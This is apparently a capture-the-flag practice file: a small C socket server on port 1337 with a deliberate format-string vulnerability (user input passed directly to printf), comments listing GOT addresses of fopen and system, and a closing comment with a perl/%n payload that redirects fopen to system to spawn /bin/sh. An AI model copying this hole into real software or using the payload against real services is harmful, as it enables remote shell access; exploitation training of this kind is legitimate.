#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <signal.h>

void usewise(int a, int b)
{
	0x90;
}

int do1()
{
	int i;
	char c[256];
	
	usewise(0, 0);
	//get addr of fopen and system (objdump -d ./p -j .plt)
	//fopen *0x804a028 == 0x08048446 (objdump -d ./p -j .got.plt)
	//system *0x804a01c == 0x08048416 (objdump -d ./p -j .got.plt)
	printf("tell me smthng:");
	fflush(stdout);
	for(i=0;i<255;i++)
	{
		c[i] = getchar();
		if(c[i] == '\n' || c[i] == EOF || c[i] == 0)
			break;
	}
	c[i] = 0;
	printf("You said:");
	printf(c);
	fflush(stdout);
	
	//give /bin/sh and be happy :))
	printf("tell me smthng else:");
	for(i=0;i<255;i++)
	{
		c[i] = getchar();
		if(c[i] == '\n' || c[i] == EOF || c[i] == 0)
			break;
	}
	c[i] = 0;
	
	puts("You said:");
	fflush(stdout);
	printf(c);
	fflush(stdout);
	
	system("");
	fopen(c, "r");
	return 0;
}

void handle_client(int client)
{
	int i;
	for(i=0;i<3;i++)
		close(i), dup(client);
	do1();
	
	char a[20];
	shutdown(client, 2);
	while(recv(client, a, sizeof(a), 0)>0);
	close(client);
	exit(0);
}

int running=1;
void sigterm(int x)
{
	__sync_fetch_and_sub(&running, 1);
}

int main(int argc, const char *argv[])
{
	int sck, client, addrlen;
	struct sockaddr_in this_addr, peer_addr;
	pid_t child_pid;
	unsigned short port = 1337;
	
	addrlen = sizeof( struct sockaddr_in );
	memset( &this_addr, 0, addrlen );
	memset( &peer_addr, 0, addrlen );
	
	this_addr.sin_port        = htons(port);
	this_addr.sin_family      = AF_INET;
	this_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	
	sck = socket( AF_INET, SOCK_STREAM, IPPROTO_IP);
	if(sck==-1)
		puts("sck");
	if(bind(sck, (struct sockaddr *)&this_addr, addrlen)!=0)
		puts("bind");
	if(listen(sck, 5)!=0)
		puts("listen");
	
	signal(SIGINT, sigterm);
	while(running)
	{
		while(running && -1 == (client = accept(sck, (struct sockaddr *)&peer_addr, &addrlen)));
		if(running)
		{
			printf("Connection from: %d.%d.%d.%d\n",
				(int)(peer_addr.sin_addr.s_addr&0xFF),
				(int)((peer_addr.sin_addr.s_addr&0xFF00)>>8),
				(int)((peer_addr.sin_addr.s_addr&0xFF0000)>>16),
				(int)((peer_addr.sin_addr.s_addr&0xFF000000)>>24));
		
			if(!fork())
				handle_client(client);
		}
	}

	close(sck);
	return 0;
}


/*
(perl -e 'print "\x28\xa0\x04\x08\x29\xa0\x04\x08\x2a\xa0\x04\x08\x2b\xa0\x04\x08"'; echo '%1$6x%7$n%1$110x%8$n%1$128x%9$n%1$4x%10$n'; echo '/bin/sh'; cat)
*/
